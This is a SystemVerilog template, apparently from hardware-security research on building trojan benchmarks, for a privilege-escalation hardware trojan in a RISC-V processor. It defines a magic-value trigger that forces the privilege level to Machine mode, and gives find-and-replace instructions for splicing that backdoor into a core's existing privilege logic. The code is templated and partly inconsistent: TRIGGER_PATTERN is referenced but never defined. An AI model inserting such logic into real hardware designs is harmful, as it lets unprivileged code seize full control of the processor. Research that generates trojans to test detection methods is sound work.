/**
 * Combinational Privilege Escalation Trojan - Code Snippet
 * 
 * Trust-Hub Status: Not applicable (processor-specific)
 * Literature Sources: Bailey 2017, Dessouky et al. 2017, De Clercq & Verbauwhede 2017
 * 
 * Description:
 *   Escalates privilege based on trigger condition
 *   
 * Trigger: Pattern match on {{TRIGGER_SIGNAL}}
 * Payload: Force {{PAYLOAD_SIGNAL}} = PRIV_LVL_M
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// RISC-V Privilege Level Constants
// ============================================================

localparam logic [1:0] PRIV_LVL_M = 2'b11;  // Machine mode
localparam logic [1:0] PRIV_LVL_S = 2'b01;  // Supervisor mode
localparam logic [1:0] PRIV_LVL_U = 2'b00;  // User mode

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Trigger pattern (magic CSR access)
localparam logic [11:0] TRIGGER_CSR = 12'h7C0;
localparam logic [31:0] MAGIC_VALUE = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = ({{TRIGGER_SIGNAL}} == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Privilege Escalation: Force {{PAYLOAD_SIGNAL}} to Machine mode
//
// Integration Script Must Modify:
//
// IF {{PAYLOAD_SIGNAL}} is assigned combinationally:
//   Find: assign {{PAYLOAD_SIGNAL}} = calculated_priv;
//   Replace: assign {{PAYLOAD_SIGNAL}} = trojan_active ? PRIV_LVL_M : calculated_priv;
//
// IF {{PAYLOAD_SIGNAL}} is in ternary operator:
//   Find: assign output = condition ? {{PAYLOAD_SIGNAL}} : default;
//   Replace: assign output = condition ? (trojan_active ? PRIV_LVL_M : {{PAYLOAD_SIGNAL}}) : default;